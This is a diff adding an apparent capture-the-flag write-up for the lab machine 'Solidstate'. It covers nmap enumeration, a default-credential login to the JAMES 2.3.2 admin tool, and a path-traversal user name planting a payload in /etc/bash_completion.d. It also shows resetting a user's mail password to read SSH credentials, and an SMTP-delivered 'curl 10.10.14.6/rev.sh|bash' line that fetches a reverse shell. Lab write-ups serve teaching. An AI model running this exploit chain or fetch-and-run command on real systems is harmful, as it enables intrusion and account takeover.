@@ -1,0 +1,122 @@
+<h1 id="solidstate">Solidstate</h1>
+
+<h1 id="enumeration">Enumeration</h1>
+
+<p>IP → 10.10.10.51</p>
+
+<p>Open ports</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT     STATE SERVICE REASON  VERSION
+22/tcp   open  ssh     syn-ack OpenSSH 7.4p1 Debian 10+deb9u1 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b <span class="o">(</span>RSA<span class="o">)</span>
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCp5WdwlckuF4slNUO29xOk/Yl/cnXT/p6qwezI0ye+4iRSyor8lhyAEku/yz8KJXtA+ALhL7HwYbD3hDUxDkFw90V1Omdedbk7SxUVBPK2CiDpvXq1+r5fVw26WpTCdawGKkaOMYoSWvliBsbwMLJEUwVbZ/GZ1SUEswpYkyZeiSC1qk72L6CiZ9/5za4MTZw8Cq0akT7G+mX7Qgc+5eOEGcqZt3cBtWzKjHyOZJAEUtwXAHly29KtrPUddXEIF0qJUxKXArEDvsp7OkuQ0fktXXkZuyN/GRFeu3im7uQVuDgiXFKbEfmoQAsvLrR8YiKFUG6QBdI9awwmTkLFbS1Z
+|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 <span class="o">(</span>ECDSA<span class="o">)</span>
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBISyhm1hXZNQl3cslogs5LKqgWEozfjs3S3aPy4k3riFb6UYu6Q1QsxIEOGBSPAWEkevVz1msTrRRyvHPiUQ+eE<span class="o">=</span>
+|   256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 <span class="o">(</span>ED25519<span class="o">)</span>
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMKbFbK3MJqjMh9oEw/2OVe0isA7e3ruHz5fhUP4cVgY
+25/tcp   open  smtp    syn-ack JAMES smtpd 2.3.2
+|_smtp-commands: solidstate Hello nmap.scanme.org <span class="o">(</span>10.10.14.6 <span class="o">[</span>10.10.14.6]<span class="o">)</span>
+80/tcp   open  http    syn-ack Apache httpd 2.4.25 <span class="o">((</span>Debian<span class="o">))</span>
+|_http-title: Home - Solid State Security
+|_http-server-header: Apache/2.4.25 <span class="o">(</span>Debian<span class="o">)</span>
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+110/tcp  open  pop3    syn-ack JAMES pop3d 2.3.2
+119/tcp  open  nntp    syn-ack JAMES nntpd <span class="o">(</span>posting ok<span class="o">)</span>
+4555/tcp open  rsip?   syn-ack
+| fingerprint-strings: 
+|   GenericLines: 
+|     JAMES Remote Administration Tool 2.3.2
+|     Please enter your login and password
+|     Login <span class="nb">id</span>:
+|     Password:
+|     Login failed <span class="k">for</span> 
+|_    Login <span class="nb">id</span>:
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port4555-TCP:V<span class="o">=</span>7.94SVN%I<span class="o">=</span>7%D<span class="o">=</span>12/13%Time<span class="o">=</span>6579B8A5%P<span class="o">=</span>x86_64-pc-linux-gnu%
+SF:r<span class="o">(</span>GenericLines,7C,<span class="s2">"JAMES</span><span class="se">\x</span><span class="s2">20Remote</span><span class="se">\x</span><span class="s2">20Administration</span><span class="se">\x</span><span class="s2">20Tool</span><span class="se">\x</span><span class="s2">202</span><span class="se">\.</span><span class="s2">3</span><span class="se">\.</span><span class="s2">2
+SF:</span><span class="se">\n</span><span class="s2">Please</span><span class="se">\x</span><span class="s2">20enter</span><span class="se">\x</span><span class="s2">20your</span><span class="se">\x</span><span class="s2">20login</span><span class="se">\x</span><span class="s2">20and</span><span class="se">\x</span><span class="s2">20password</span><span class="se">\n</span><span class="s2">Login</span><span class="se">\x</span><span class="s2">20id:</span><span class="se">\n</span><span class="s2">Pa
+SF:ssword:</span><span class="se">\n</span><span class="s2">Login</span><span class="se">\x</span><span class="s2">20failed</span><span class="se">\x</span><span class="s2">20for</span><span class="se">\x</span><span class="s2">20</span><span class="se">\n</span><span class="s2">Login</span><span class="se">\x</span><span class="s2">20id:</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span><span class="p">;</span>
+Service Info: Host: solidstate<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<p>We can search in the web server but we won’t get nothing. A quicnck search for the version of JAMES gives us a Python script to gain a RCE.</p>
+
+<h1 id="foothold">Foothold</h1>
+
+<p>We will follow all the steps to execute a command but manually. First we will connect to JAMES in port 4555 with the default credentials <code class="language-plaintext highlighter-rouge">root:root</code>.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="nx">kali</span><span class="p">)</span><span class="n">-</span><span class="p">[</span><span class="n">~/machines/linux/solidstate</span><span class="p">]</span><span class="w">
+</span><span class="err">└─$</span><span class="w"> </span><span class="n">telnet</span><span class="w"> </span><span class="mf">10.10</span><span class="o">.</span><span class="nf">10</span><span class="o">.</span><span class="nf">51</span><span class="w"> </span><span class="mi">4555</span><span class="w">
+</span><span class="n">Trying</span><span class="w"> </span><span class="mf">10.10</span><span class="o">.</span><span class="nf">10</span><span class="o">.</span><span class="nf">51</span><span class="o">...</span><span class="w">
+</span><span class="n">Connected</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="mf">10.10</span><span class="o">.</span><span class="nf">10</span><span class="o">.</span><span class="nf">51</span><span class="o">.</span><span class="w">
+</span><span class="n">Escape</span><span class="w"> </span><span class="n">character</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="s1">'^]'</span><span class="o">.</span><span class="w">
+</span><span class="n">JAMES</span><span class="w"> </span><span class="n">Remote</span><span class="w"> </span><span class="n">Administration</span><span class="w"> </span><span class="n">Tool</span><span class="w"> </span><span class="mf">2.3</span><span class="o">.</span><span class="nf">2</span><span class="w">
+</span><span class="n">Please</span><span class="w"> </span><span class="n">enter</span><span class="w"> </span><span class="n">your</span><span class="w"> </span><span class="n">login</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="n">password</span><span class="w">
+</span><span class="n">Login</span><span class="w"> </span><span class="n">id</span><span class="p">:</span><span class="w">
+</span><span class="n">root</span><span class="w">
+</span><span class="n">Password</span><span class="p">:</span><span class="w">
+</span><span class="n">root</span><span class="w">
+</span><span class="n">Welcome</span><span class="w"> </span><span class="n">root.</span><span class="w"> </span><span class="n">HELP</span><span class="w"> </span><span class="n">for</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="nx">list</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">commands</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Once this is done, the scripts needs that a user connects to the machine via SSH to exploit the vulnerability, so we will search in all mails until we find something. We create a special user and change the password of the rest of the users.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">adduser</span><span class="w"> </span><span class="o">..</span><span class="nx">/../../../../../../../etc/bash_completion.d</span><span class="w"> </span><span class="nx">exploit</span><span class="w">
+</span><span class="n">set</span><span class="w"> </span><span class="nx">password</span><span class="w"> </span><span class="nx">mindy</span><span class="w"> </span><span class="nx">mindy</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Then we can connect from POP3 in port 110 to check the mail. In mindy mail we will find his credentials for SSH.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="nx">kali</span><span class="p">)</span><span class="n">-</span><span class="p">[</span><span class="n">~/machines/linux/solidstate</span><span class="p">]</span><span class="w">
+</span><span class="err">└─$</span><span class="w"> </span><span class="n">telnet</span><span class="w"> </span><span class="mf">10.10</span><span class="o">.</span><span class="nf">10</span><span class="o">.</span><span class="nf">51</span><span class="w"> </span><span class="mi">110</span><span class="w">
+</span><span class="n">Trying</span><span class="w"> </span><span class="mf">10.10</span><span class="o">.</span><span class="nf">10</span><span class="o">.</span><span class="nf">51</span><span class="o">...</span><span class="w">
+</span><span class="n">Connected</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="mf">10.10</span><span class="o">.</span><span class="nf">10</span><span class="o">.</span><span class="nf">51</span><span class="o">.</span><span class="w">
+</span><span class="n">Escape</span><span class="w"> </span><span class="n">character</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="s1">'^]'</span><span class="o">.</span><span class="w">
+</span><span class="o">+</span><span class="n">OK</span><span class="w"> </span><span class="n">solidstate</span><span class="w"> </span><span class="n">POP3</span><span class="w"> </span><span class="n">server</span><span class="w"> </span><span class="p">(</span><span class="n">JAMES</span><span class="w"> </span><span class="n">POP3</span><span class="w"> </span><span class="n">Server</span><span class="w"> </span><span class="mf">2.3</span><span class="o">.</span><span class="nf">2</span><span class="p">)</span><span class="w"> </span><span class="n">ready</span><span class="w"> 
+</span><span class="n">USER</span><span class="w"> </span><span class="n">Mindy</span><span class="w">
+</span><span class="o">+</span><span class="n">OK</span><span class="w">
+</span><span class="n">pass</span><span class="w"> </span><span class="n">mindy</span><span class="w">
+</span><span class="nt">-ERR</span><span class="w"> </span><span class="n">Authentication</span><span class="w"> </span><span class="n">failed.</span><span class="w">
+</span><span class="n">USER</span><span class="w"> </span><span class="n">mindy</span><span class="w">
+</span><span class="o">+</span><span class="n">OK</span><span class="w">
+</span><span class="n">pass</span><span class="w"> </span><span class="n">mindy</span><span class="w">
+</span><span class="o">+</span><span class="n">OK</span><span class="w"> </span><span class="n">Welcome</span><span class="w"> </span><span class="n">mindy</span><span class="w">
+</span><span class="n">list</span><span class="w">
+</span><span class="o">+</span><span class="n">OK</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="mi">1945</span><span class="w">
+</span><span class="mi">1</span><span class="w"> </span><span class="mi">1109</span><span class="w">
+</span><span class="mi">2</span><span class="w"> </span><span class="mi">836</span><span class="w">
+</span><span class="o">.</span><span class="w">
+</span><span class="n">RETR</span><span class="w"> </span><span class="mi">2</span><span class="w">
+</span><span class="err">&lt;</span><span class="n">SNIP</span><span class="err">&gt;</span><span class="w">
+</span><span class="n">username</span><span class="p">:</span><span class="w"> </span><span class="n">mindy</span><span class="w">
+</span><span class="n">pass</span><span class="p">:</span><span class="w"> </span><span class="n">P</span><span class="err">@</span><span class="nx">55W0rd1</span><span class="o">!</span><span class="nx">2</span><span class="err">@</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Now we have to trigger a reverse shell, because although we gained access to the machine via SSH, it is a restricted environment.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="nx">kali</span><span class="p">)</span><span class="n">-</span><span class="p">[</span><span class="n">~/machines/linux/solidstate</span><span class="p">]</span><span class="w">
+</span><span class="err">└─$</span><span class="w"> </span><span class="n">telnet</span><span class="w"> </span><span class="mf">10.10</span><span class="o">.</span><span class="nf">10</span><span class="o">.</span><span class="nf">51</span><span class="w"> </span><span class="mi">25</span><span class="w"> 
+</span><span class="n">Trying</span><span class="w"> </span><span class="mf">10.10</span><span class="o">.</span><span class="nf">10</span><span class="o">.</span><span class="nf">51</span><span class="o">...</span><span class="w">
+</span><span class="n">Connected</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="mf">10.10</span><span class="o">.</span><span class="nf">10</span><span class="o">.</span><span class="nf">51</span><span class="o">.</span><span class="w">
+</span><span class="n">Escape</span><span class="w"> </span><span class="n">character</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="s1">'^]'</span><span class="o">.</span><span class="w">
+</span><span class="mi">220</span><span class="w"> </span><span class="n">solidstate</span><span class="w"> </span><span class="n">SMTP</span><span class="w"> </span><span class="n">Server</span><span class="w"> </span><span class="p">(</span><span class="n">JAMES</span><span class="w"> </span><span class="n">SMTP</span><span class="w"> </span><span class="n">Server</span><span class="w"> </span><span class="mf">2.3</span><span class="o">.</span><span class="nf">2</span><span class="p">)</span><span class="w"> </span><span class="n">ready</span><span class="w"> </span><span class="n">Wed</span><span class="p">,</span><span class="w"> </span><span class="mi">13</span><span class="w"> </span><span class="n">Dec</span><span class="w"> </span><span class="mi">2023</span><span class="w"> </span><span class="mi">10</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="mi">27</span><span class="w"> </span><span class="nt">-0500</span><span class="w"> </span><span class="p">(</span><span class="n">EST</span><span class="p">)</span><span class="w">
+</span><span class="n">HELO</span><span class="w"> </span><span class="n">CEN</span><span class="w">
+</span><span class="mi">250</span><span class="w"> </span><span class="n">solidstate</span><span class="w"> </span><span class="n">Hello</span><span class="w"> </span><span class="n">CEN</span><span class="w"> </span><span class="p">(</span><span class="mf">10.10</span><span class="o">.</span><span class="nf">14</span><span class="o">.</span><span class="nf">6</span><span class="w"> </span><span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="nf">14</span><span class="o">.</span><span class="nf">6</span><span class="p">])</span><span class="w">
+</span><span class="n">mail</span><span class="w"> </span><span class="n">from</span><span class="p">:</span><span class="err">&lt;</span><span class="n">mindy</span><span class="err">&gt;</span><span class="w">
+</span><span class="mi">250</span><span class="w"> </span><span class="mf">2.1</span><span class="o">.</span><span class="nf">0</span><span class="w"> </span><span class="n">Sender</span><span class="w"> </span><span class="err">&lt;</span><span class="n">mindy</span><span class="err">@</span><span class="n">localhost</span><span class="err">&gt;</span><span class="w"> </span><span class="n">OK</span><span class="w">
+</span><span class="n">rcpt</span><span class="w"> </span><span class="n">to</span><span class="p">:</span><span class="err">&lt;</span><span class="o">..</span><span class="n">/../../../../../../../etc/bash_completion.d</span><span class="err">&gt;</span><span class="w">
+</span><span class="mi">250</span><span class="w"> </span><span class="mf">2.1</span><span class="o">.</span><span class="nf">5</span><span class="w"> </span><span class="n">Recipient</span><span class="w"> </span><span class="err">&lt;</span><span class="o">..</span><span class="n">/../../../../../../../etc/bash_completion.d</span><span class="err">@</span><span class="nx">localhost</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">OK</span><span class="w">
+</span><span class="n">data</span><span class="w"> 
+</span><span class="mi">354</span><span class="w"> </span><span class="n">Ok</span><span class="w"> </span><span class="n">Send</span><span class="w"> </span><span class="n">data</span><span class="w"> </span><span class="n">ending</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="err">&lt;</span><span class="n">CRLF</span><span class="err">&gt;</span><span class="o">.</span><span class="err">&lt;</span><span class="n">CRLF</span><span class="err">&gt;</span><span class="w">
+</span><span class="n">From</span><span class="p">:</span><span class="w"> </span><span class="n">mindy</span><span class="err">@</span><span class="n">localhost</span><span class="w">
+</span><span class="s1">'
+curl 10.10.14.6/rev.sh|bash
+.
+250 2.6.0 Message received
+quit
+221 2.0.0 solidstate Service closing transmission channel
+</span></code></pre></div></div>
+
+<p>For priv esc there is a cron job we can abuse</p>
